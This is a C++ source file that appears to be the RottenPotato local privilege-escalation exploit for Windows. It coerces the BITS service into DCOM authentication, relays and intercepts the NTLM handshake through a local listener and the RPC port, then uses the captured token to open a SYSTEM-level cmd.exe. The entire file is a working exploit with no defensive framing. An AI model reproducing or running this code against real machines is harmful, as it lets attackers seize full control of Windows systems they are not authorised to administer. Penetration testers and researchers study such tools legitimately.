#include "stdafx.h"
#include "MSFRottenPotato.h"
#include "IStorageTrigger.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h> 
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

int CMSFRottenPotato::newConnection;

// This is the constructor of a class that has been exported.
// see MSFRottenPotato.h for the class definition
CMSFRottenPotato::CMSFRottenPotato()
{
	comSendQ = new BlockingQueue<char*>();
	rpcSendQ = new BlockingQueue<char*>();
	newConnection = 0;
	negotiator = new LocalNegotiator();
    return;
}


DWORD CMSFRottenPotato::startRPCConnectionThread() {
	DWORD ThreadID;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartRPCConnection, (void*) this, 0, &ThreadID);
	return ThreadID;
}

DWORD CMSFRottenPotato::startCOMListenerThread() {
	DWORD ThreadID;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartCOMListener, (void*) this, 0, &ThreadID);
	return ThreadID;
}

DWORD WINAPI CMSFRottenPotato::staticStartRPCConnection(void* Param)
{
	CMSFRottenPotato* This = (CMSFRottenPotato*)Param;
	return This->startRPCConnection();
}

DWORD WINAPI CMSFRottenPotato::staticStartCOMListener(void* Param)
{
	CMSFRottenPotato* This = (CMSFRottenPotato*)Param;
	return This->startCOMListener();
}

int CMSFRottenPotato::findNTLMBytes(char *bytes,int len) {
	//Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
	//The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
	//we can just return the index
	char pattern[7] = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
	int pIdx = 0;
	int i;
	for (i = 0; i < len; i++) {
		if (bytes[i] == pattern[pIdx]) {
			pIdx = pIdx + 1;
			if (pIdx == 7) return (i - 6);
		}
		else {
			pIdx = 0;
		}
	}
	return -1;
}

int CMSFRottenPotato::processNtlmBytes(char *bytes, int len) {
	int ntlmLoc = findNTLMBytes(bytes, len);
	if (ntlmLoc == -1) return -1;

	int messageType = bytes[ntlmLoc + 8];
	switch (messageType) {
		//NTLM type 1 message
		case 1:
			negotiator->handleType1(bytes + ntlmLoc, len - ntlmLoc);
			break;
		//NTLM type 2 message
		case 2:
			negotiator->handleType2(bytes + ntlmLoc, len - ntlmLoc);
			break;
		//NTLM type 3 message
		case 3:
			negotiator->handleType3(bytes + ntlmLoc, len - ntlmLoc);
			break;
		default:
			printf("Error - Unknown NTLM message type...");
			return -1;
			break;
	}
	return 0;
}

int checkForNewConnection(SOCKET* ListenSocket, SOCKET* ClientSocket) {
	fd_set readSet;
	FD_ZERO(&readSet);
	FD_SET(*ListenSocket, &readSet);
	timeval timeout;
	timeout.tv_sec = 1;  // Zero timeout (poll)
	timeout.tv_usec = 0;
	if (select(*ListenSocket, &readSet, NULL, NULL, &timeout) == 1) {
		*ClientSocket = accept(*ListenSocket, NULL, NULL);
		return 1;
	}
	return 0;
}

int CMSFRottenPotato::triggerDCOM(void)
{
	CoInitialize(nullptr);

	//Create IStorage object
	IStorage *stg = NULL;
	ILockBytes *lb = NULL;
	CreateILockBytesOnHGlobal(NULL, true, &lb);
	StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);

	//Initialze IStorageTrigger object
	IStorageTrigger* t = new IStorageTrigger(stg);

	//Prep a few more args for CoGetInstanceFromIStorage
	CLSID clsid;
	//BITS IID
	CLSIDFromString(OLESTR("{4991d34b-80a1-4291-83b6-3328366b9097}"), &clsid);
	CLSID tmp;
	//IUnknown IID
	CLSIDFromString(OLESTR("{00000000-0000-0000-C000-000000000046}"), &tmp);
	MULTI_QI qis[1];
	qis[0].pIID = &tmp;
	qis[0].pItf = NULL;
	qis[0].hr = 0;

	//Call CoGetInstanceFromIStorage
	HRESULT status = CoGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);

	return 0;
}

int CMSFRottenPotato::startRPCConnection(void) {
	const int DEFAULT_BUFLEN = 4096;
	PCSTR DEFAULT_PORT = "135";
	PCSTR host = "127.0.0.1";

	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;

	char *sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(host, DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	// Send/Receive until the peer closes the connection
	do {

		//Monitor our sendQ until we have some data to send
		int *len = (int*)rpcSendQ->wait_pop();
		sendbuf = rpcSendQ->wait_pop();

		//Check if we should be opening a new socket before we send the data
		if (newConnection == 1) {
			//closesocket(ConnectSocket);
			ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,ptr->ai_protocol);
			connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
			newConnection = 0;
		}

		iResult = send(ConnectSocket, sendbuf, *len, 0);
		if (iResult == SOCKET_ERROR) {
			printf("RPC -> send failed with error: %d\n", WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			return 1;
		}
		printf("RPC -> bytes Sent: %ld\n", iResult);

		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			printf("RPC -> bytes received: %d\n", iResult);
			comSendQ->push((char*)&iResult);
			comSendQ->push(recvbuf);
		}
		else if (iResult == 0)
			printf("RPC-> Connection closed\n");
		else
			printf("RPC -> recv failed with error: %d\n", WSAGetLastError());

	} while (iResult > 0);

	// cleanup
	iResult = shutdown(ConnectSocket, SD_SEND);
	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}

int CMSFRottenPotato::startCOMListener(void) {
	const int DEFAULT_BUFLEN = 4096;
	PCSTR DEFAULT_PORT = "6666";
	
	WSADATA wsaData;
	int iResult;

	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ClientSocket = INVALID_SOCKET;

	struct addrinfo *result = NULL;
	struct addrinfo hints;

	int iSendResult;
	char *sendbuf;

	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	// Resolve the server address and port
	iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	// Accept a client socket
	ClientSocket = accept(ListenSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	// Receive until the peer shuts down the connection
	int ntlmLoc;
	do {
		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			printf("COM -> bytes received: %d\n", iResult);

			//check to see if the received packet has NTLM auth information
			processNtlmBytes(recvbuf, iResult);

			//Send all incoming packets to the WinRPC sockets "send queue" and wait for the WinRPC socket to put a packet into our "send queue"
			//put packet in winrpc_sendq
			rpcSendQ->push((char*)&iResult);
			rpcSendQ->push(recvbuf);

			//block and wait for a new item in our sendq
			int* len = (int*)comSendQ->wait_pop();
			sendbuf = comSendQ->wait_pop();
			
			//Check to see if this is a packet containing NTLM authentication information before sending
			processNtlmBytes(sendbuf, *len);

			//send the new packet sendbuf
			iSendResult = send(ClientSocket, sendbuf, *len, 0);

			if (iSendResult == SOCKET_ERROR) {
				printf("COM -> send failed with error: %d\n", WSAGetLastError());
				closesocket(ClientSocket);
				WSACleanup();
				return 1;
			}
			printf("COM -> bytes sent: %d\n", iSendResult);
			
			//Sometimes Windows likes to open a new connection instead of using the current one
			//Allow for this by waiting for 1s and replacing the ClientSocket if a new connection is incoming
			newConnection = checkForNewConnection(&ListenSocket, &ClientSocket);
		}
		else if (iResult == 0)
			printf("Connection closing...\n");
		else {
			printf("COM -> recv failed with error: %d\n", WSAGetLastError());
			closesocket(ClientSocket);
			WSACleanup();
			return 1;
		}

	} while (iResult > 0);

	// shutdown the connection since we're done
	iResult = shutdown(ClientSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		return 1;
	}

	// cleanup
	closesocket(ClientSocket);
	WSACleanup();

	return 0;
}

int main()
{
	CMSFRottenPotato* test = new CMSFRottenPotato();
	test->startCOMListenerThread();
	test->startRPCConnectionThread();
	test->triggerDCOM();
	int ret = 0;
	while (true) {
		if (test->negotiator->authResult != -1) {
			/*Enable the priv if possible*/
			HANDLE hToken;
			TOKEN_PRIVILEGES tkp;

			// Get a token for this process. 

			if (!OpenProcessToken(GetCurrentProcess(),
				TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))return 0;

			// Get the LUID for the Impersonate privilege. 
			int res = LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME,
				&tkp.Privileges[0].Luid);

			tkp.PrivilegeCount = 1;  // one privilege to set    
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			// Get the impersonate priv for this process. 
			res = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);

			HANDLE elevated_token;
			QuerySecurityContextToken(test->negotiator->phContext, &elevated_token);

			PROCESS_INFORMATION pi;
			STARTUPINFO si;
			BOOL result;

			ZeroMemory(&si, sizeof(STARTUPINFO));
			ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
			memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
			si.cb = sizeof(STARTUPINFO);

			wchar_t *cmdPath = L"C:\\Windows\\System32\\cmd.exe";
			wchar_t *args = L"";

			printf("Running %S with args %S\n", cmdPath, args);

			result = CreateProcessWithTokenW(elevated_token,
				0,
				cmdPath,
				args,
				CREATE_NEW_CONSOLE,
				NULL,
				NULL,
				&si,
				&pi);

			if (!result) {
				printf("[-] Failed to create proc: %d\n", GetLastError());
			}

			break;
		}
		else {
			printf("Waiting for auth...");
			Sleep(500);
		}
	}

	printf("Auth result: %d\n", test->negotiator->authResult);
	printf("Return code: %d\n", ret);
	printf("Last error: %d\n", GetLastError());
	return ret;
}